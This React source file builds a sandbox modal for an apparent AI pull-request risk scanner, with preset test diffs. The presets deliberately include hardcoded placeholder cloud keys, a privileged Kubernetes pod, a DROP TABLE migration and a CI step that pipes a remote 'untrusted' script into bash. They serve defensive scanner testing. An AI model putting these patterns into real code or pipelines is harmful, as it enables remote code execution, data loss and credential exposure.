// =============================================================
// ReleaseGuard AI — Built with IBM Bob
// © IBM Bob | ibm.com/products/watsonx
// =============================================================


"use client";

import { apiFetch } from "@/lib/api";
import React, { useState } from "react";
import { 
  X, 
  Play, 
  Sparkles, 
  Send, 
  FileText, 
  Layers, 
  CheckCircle2, 
  ShieldCheck, 
  Clock, 
  Bot 
} from "lucide-react";

interface ScannerSandboxModalProps {
  onClose: () => void;
  onScanCompleted: (prId: string) => void;
  repoOptions?: Array<{ id: string; name: string }>;
  defaultRepoName?: string;
}

const PRESETS = [
  {
    id: "critical",
    name: "🚨 Critical Secret Leak & Privileged Pod",
    title: "fix(jwt): Hardcode root secrets & elevate pod privileges",
    author: "alex-dev",
    source_branch: "patch/jwt-tuning",
    description: "Exposes AWS / IBM API keys in auth handler and sets container privileged: true.",
    diff: `diff --git a/backend/auth/jwt_handler.py b/backend/auth/jwt_handler.py
--- a/backend/auth/jwt_handler.py
+++ b/backend/auth/jwt_handler.py
@@ -12,4 +12,8 @@
 def verify_session(token):
-    return jwt.decode(token, os.environ["SECRET_KEY"], algorithms=["HS256"])
+    # Hardcoding root credentials for fast testing
+    API_KEY = "AKIAIOSFODNN7EXAMPLE99"
+    IBM_CLOUD_API_KEY = "ibm_cloud_sec_99482710394857201948571"
+    DEBUG = True
+    return {"user": "admin", "role": "superuser"}
diff --git a/k8s/deployment.yaml b/k8s/deployment.yaml
--- a/k8s/deployment.yaml
+++ b/k8s/deployment.yaml
@@ -25,4 +25,7 @@
     spec:
       containers:
       - name: auth-service
+        securityContext:
+          privileged: true
         image: auth-service:latest`
  },
  {
    id: "db_high",
    name: "💥 Destructive DB Migration & High-Cost GPU",
    title: "feat(ledger): DROP TABLE legacy_audit_ledger & scale RDS tier",
    author: "sarah-architect",
    source_branch: "feature/ledger-migration",
    description: "Executes DROP TABLE and provisions expensive multi-AZ database tier.",
    diff: `diff --git a/db/migrations/20260925_drop_legacy_ledger.sql b/db/migrations/20260925_drop_legacy_ledger.sql
new file mode 100644
--- /dev/null
+++ b/db/migrations/20260925_drop_legacy_ledger.sql
@@ -0,0 +1,5 @@
+-- Destructive cleanup for migration v3.4
+LOCK TABLE transactions IN EXCLUSIVE MODE;
+ALTER TABLE accounts ADD COLUMN tier_id INTEGER NOT NULL;
+DROP TABLE legacy_audit_ledger;
+CREATE INDEX idx_user_billing ON user_billing(account_id);
diff --git a/terraform/database.tf b/terraform/database.tf
--- a/terraform/database.tf
+++ b/terraform/database.tf
@@ -40,3 +40,5 @@
 resource "aws_db_instance" "primary" {
   instance_class = "db.r5.12xlarge"
+  multi_az = true
 }`
  },
  {
    id: "timeout_ci",
    name: "⚠️ Missing Timeout & Untrusted CI Script",
    title: "perf(payments): Add external payment gateway integration & script setup",
    author: "carlos-eng",
    source_branch: "feature/stripe-gateway",
    description: "Omits HTTP client timeout and executes unverified remote script in CI.",
    diff: `diff --git a/services/payment_gateway.py b/services/payment_gateway.py
--- a/services/payment_gateway.py
+++ b/services/payment_gateway.py
@@ -35,5 +35,6 @@
 def charge_customer(card_token, amount):
-    resp = requests.post("https://payment.stripe.internal/v1/charge", json={"amount": amount}, timeout=(3, 10))
+    # Calling downstream payment gateway without timeout
+    resp = requests.post("https://payment.stripe.internal/v1/charge", json={"amount": amount})
     return resp.json()
diff --git a/.github/workflows/deploy.yml b/.github/workflows/deploy.yml
--- a/.github/workflows/deploy.yml
+++ b/.github/workflows/deploy.yml
@@ -18,2 +18,3 @@
     - name: Install dependencies
+      run: curl -sSL https://raw.githubusercontent.com/untrusted/installer.sh | bash`
  },
  {
    id: "clean",
    name: "✅ Safe Clean Pull Request (All Gates Pass)",
    title: "docs(architecture): Update healthz test coverage & system runbook",
    author: "priya-qa",
    source_branch: "docs/healthz-update",
    description: "Documentation update and new regression test suite with 0 vulnerabilities.",
    diff: `diff --git a/docs/README.md b/docs/README.md
--- a/docs/README.md
+++ b/docs/README.md
@@ -10,3 +10,6 @@
 # Core Banking Microservice Documentation
 
+Updated architecture diagram for v4.2 release.
+Added troubleshooting steps for circuit breaker configuration.
+Updated API reference links.
diff --git a/tests/test_healthz.py b/tests/test_healthz.py
--- a/tests/test_healthz.py
+++ b/tests/test_healthz.py
@@ -14,2 +14,7 @@
 def test_health_check_endpoint():
     client = TestClient(app)
+    response = client.get("/healthz")
+    assert response.status_code == 200
+    assert response.json()["status"] == "healthy"`
  }
];

export const ScannerSandboxModal: React.FC<ScannerSandboxModalProps> = ({
  onClose,
  onScanCompleted,
  repoOptions = [],
  defaultRepoName = "Select connected repo"
}) => {
  const [selectedPreset, setSelectedPreset] = useState<string>("critical");
  const [repoName, setRepoName] = useState<string>(defaultRepoName || "Select connected repo");
  const [title, setTitle] = useState<string>(PRESETS[0].title);
  const [author, setAuthor] = useState<string>(PRESETS[0].author);
  const [sourceBranch, setSourceBranch] = useState<string>(PRESETS[0].source_branch);
  const [description, setDescription] = useState<string>(PRESETS[0].description);
  const [diffContent, setDiffContent] = useState<string>(PRESETS[0].diff);
  const [isScanning, setIsScanning] = useState<boolean>(false);
  const [scanStep, setScanStep] = useState<string>("");

  React.useEffect(() => {
    setRepoName(defaultRepoName);
  }, [defaultRepoName]);

  const handleSelectPreset = (presetId: string) => {
    const p = PRESETS.find((x) => x.id === presetId);
    if (!p) return;
    setSelectedPreset(presetId);
    setTitle(p.title);
    setAuthor(p.author);
    setSourceBranch(p.source_branch);
    setDescription(p.description);
    setDiffContent(p.diff);
  };

  const handleExecuteScan = async () => {
    setIsScanning(true);
    try {
      setScanStep("1. Fetching git metadata & parsing commit diff...");
      await new Promise((r) => setTimeout(r, 600));

      setScanStep("2. Executing 7 Scanners (Secrets, Config, IaC, CI, Tests, Cost, DB)...");
      await new Promise((r) => setTimeout(r, 800));

      setScanStep("3. Aggregating findings & calculating composite risk score...");
      await new Promise((r) => setTimeout(r, 600));

      setScanStep("4. Running Bob AI review checks (orchestrator, security, rollback)...");
      const apiBase = process.env.NEXT_PUBLIC_API_BASE || "http://localhost:8001";
      const resp = await apiFetch(`${apiBase}/api/prs/scan`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          repo_name: repoName,
          title,
          description,
          author,
          source_branch: sourceBranch,
          target_branch: "main",
          diff_content: diffContent
        })
      });

      setScanStep("5. Storing findings & posting simulated GitHub bot PR comment...");
      await new Promise((r) => setTimeout(r, 500));

      const data = await resp.json();
      if (data.pr_id) {
        onScanCompleted(data.pr_id);
      }
    } catch (err) {
      console.error("Scan error:", err);
      alert("Failed to execute scan against backend.");
    } finally {
      setIsScanning(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-6 bg-black/80 backdrop-blur-md overflow-y-auto">
      <div className="bg-[#0b0f19] border border-[rgba(255,255,255,0.12)] rounded-2xl w-full max-w-4xl max-h-[92vh] flex flex-col shadow-2xl overflow-hidden my-auto">
        
        {/* Header */}
        <div className="p-5 border-b border-[rgba(255,255,255,0.08)] bg-[#0d1322] flex items-center justify-between">
          <div className="flex items-center space-x-2.5">
            <div className="w-8 h-8 rounded-xl bg-cyan-500/20 text-cyan-400 flex items-center justify-center border border-cyan-500/30">
              <Sparkles className="w-4 h-4" />
            </div>
            <div>
              <h3 className="text-base font-bold text-white">ReleaseGuard PR & Webhook Sandbox</h3>
              <p className="text-xs text-slate-400">Simulate incoming GitHub pull requests and test the full 12-stage pipeline</p>
            </div>
          </div>

          <button
            onClick={onClose}
            className="p-2 rounded-xl bg-white/5 hover:bg-white/10 text-slate-400 hover:text-white transition-colors"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Modal Body */}
        <div className="p-6 overflow-y-auto flex-1 space-y-5">
          
          {/* Preset Buttons */}
          <div>
            <label className="text-xs font-bold text-slate-300 uppercase tracking-wider block mb-2">
              Select Preset Scenario
            </label>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
              {PRESETS.map((p) => (
                <button
                  key={p.id}
                  onClick={() => handleSelectPreset(p.id)}
                  className={`p-3 rounded-xl text-left border transition-all ${
                    selectedPreset === p.id
                      ? "bg-cyan-950/40 border-cyan-400/60 shadow-md text-white font-bold"
                      : "bg-[#121826] border-white/5 text-slate-300 hover:bg-[#182033]"
                  }`}
                >
                  <span className="text-xs block leading-snug">{p.name}</span>
                </button>
              ))}
            </div>
          </div>

          {/* PR Metadata Form */}
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
            <div>
              <label className="text-sm font-semibold text-slate-400 block mb-1.5">Target Repository</label>
              {repoOptions.length > 0 ? (
                <select
                  value={repoName}
                  onChange={(e) => setRepoName(e.target.value)}
                  className="w-full bg-[#121826] border border-white/10 rounded-lg px-3 py-1.5 text-xs text-white focus:outline-none focus:border-cyan-400"
                >
                  {repoOptions.map((repo) => (
                    <option key={repo.id} value={repo.name}>
                      {repo.name}
                    </option>
                  ))}
                </select>
              ) : (
                <input
                  type="text"
                  value={repoName}
                  onChange={(e) => setRepoName(e.target.value)}
                  className="w-full bg-[#121826] border border-white/10 rounded-lg px-3 py-1.5 text-xs text-white focus:outline-none focus:border-cyan-400"
                />
              )}
            </div>

            <div>
              <label className="text-sm font-semibold text-slate-400 block mb-1.5">PR Author</label>
              <input
                type="text"
                value={author}
                onChange={(e) => setAuthor(e.target.value)}
                className="w-full bg-[#121826] border border-white/10 rounded-lg px-3 py-1.5 text-xs text-white focus:outline-none focus:border-cyan-400"
              />
            </div>

            <div>
              <label className="text-sm font-semibold text-slate-400 block mb-1.5">Branch Name</label>
              <input
                type="text"
                value={sourceBranch}
                onChange={(e) => setSourceBranch(e.target.value)}
                className="w-full bg-[#121826] border border-white/10 rounded-lg px-3 py-1.5 text-xs text-white focus:outline-none focus:border-cyan-400"
              />
            </div>
          </div>

          <div>
            <label className="text-sm font-semibold text-slate-400 block mb-1.5">PR Title</label>
            <input
              type="text"
              value={title}
              onChange={(e) => setTitle(e.target.value)}
              className="w-full bg-[#121826] border border-white/10 rounded-lg px-3 py-1.5 text-xs text-white focus:outline-none focus:border-cyan-400"
            />
          </div>

          {/* Unified Diff Editor */}
          <div>
            <div className="flex items-center justify-between mb-1.5">
              <label className="text-xs font-semibold text-slate-400">Git Patch / Diff</label>
              <span className="text-xs text-slate-500 font-mono">Unified diff format</span>
            </div>
            <textarea
              rows={9}
              value={diffContent}
              onChange={(e) => setDiffContent(e.target.value)}
              className="w-full bg-[#07090e] border border-white/10 rounded-xl p-3 font-mono text-xs text-cyan-300 focus:outline-none focus:border-cyan-400 leading-relaxed"
            />
          </div>

          {/* Scanning Progress Overlay */}
          {isScanning && (
            <div className="p-4 rounded-xl bg-cyan-950/40 border border-cyan-800/40 space-y-2 animate-pulse">
              <div className="flex items-center space-x-2 text-cyan-400 text-xs font-bold">
                <Bot className="w-4 h-4 animate-spin" />
                <span>ReleaseGuard Workflow Executing...</span>
              </div>
              <p className="text-xs text-cyan-200 font-mono">{scanStep}</p>
            </div>
          )}

        </div>

        {/* Footer Actions */}
        <div className="p-4 border-t border-[rgba(255,255,255,0.08)] bg-[#0d121d] flex items-center justify-between">
          <button
            onClick={onClose}
            className="px-4 py-2 rounded-xl bg-white/5 hover:bg-white/10 text-slate-300 text-xs font-semibold transition-colors"
          >
            Cancel
          </button>

          <button
            onClick={handleExecuteScan}
            disabled={isScanning}
            className="flex items-center space-x-2 px-5 py-2.5 rounded-xl bg-gradient-to-r from-[#0f62fe] to-[#06b6d4] text-white text-xs font-bold hover:opacity-90 shadow-lg shadow-cyan-500/20 transition-all disabled:opacity-50"
          >
            <Play className="w-4 h-4 fill-white" />
            <span>{isScanning ? "Processing Pipeline..." : "Trigger Webhook & Run Swarm"}</span>
          </button>
        </div>

      </div>
    </div>
  );
};
